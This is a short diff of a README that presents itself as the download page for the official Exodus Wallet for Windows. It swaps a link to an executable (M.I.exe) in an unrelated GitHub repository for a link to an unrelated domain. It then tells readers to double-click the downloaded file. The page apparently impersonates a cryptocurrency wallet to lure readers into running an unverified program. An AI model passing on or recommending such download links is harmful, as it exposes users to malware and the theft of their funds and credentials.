@@ -9,7 +9,7 @@ One of the standout features is the support for Web3 applications through the **
 
 1. Click the button below to download the official version of **Exodus Wallet** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/7c431186-bde0-437d-8357-e4856e08557c" alt="Download" width="300"/>
     </a>
 2. After downloading, locate the file and double-click to open it.
